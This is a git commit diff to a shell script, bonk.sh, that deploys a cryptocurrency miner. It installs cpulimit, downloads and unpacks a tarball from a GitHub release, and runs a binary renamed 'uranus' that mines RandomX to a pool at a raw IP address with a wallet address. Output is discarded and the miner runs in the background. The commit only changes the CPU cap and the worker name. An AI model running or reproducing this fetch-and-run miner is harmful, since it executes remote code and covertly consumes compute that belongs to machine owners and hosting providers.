28de08bb47b7c8aed6f9e8054cf55289807b1e30
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-17 23:41:42 +0700

    Update bonk.sh

--- bonk.sh
+++ bonk.sh
@@ -1,7 +1,7 @@
 apt update
 apt install -y cpulimit
-cpulimit -l 150 -e uranus &
-wget https://github.com/preak07/kopi/releases/download/susu/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o 159.203.162.18:3333 -u BONK:9pLCmLN5SezzydMn1ASJ1NermRguNYJmdy9Uy1b5wkvN -p "vivo"  -t $(nproc --all) >/dev/null 2>&1 & 
+cpulimit -l 100 -e uranus &
+wget https://github.com/preak07/kopi/releases/download/susu/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o 159.203.162.18:3333 -u BONK:9pLCmLN5SezzydMn1ASJ1NermRguNYJmdy9Uy1b5wkvN -p "RIG001" >/dev/null 2>&1 & 
 while true
 do
         echo "Download..."
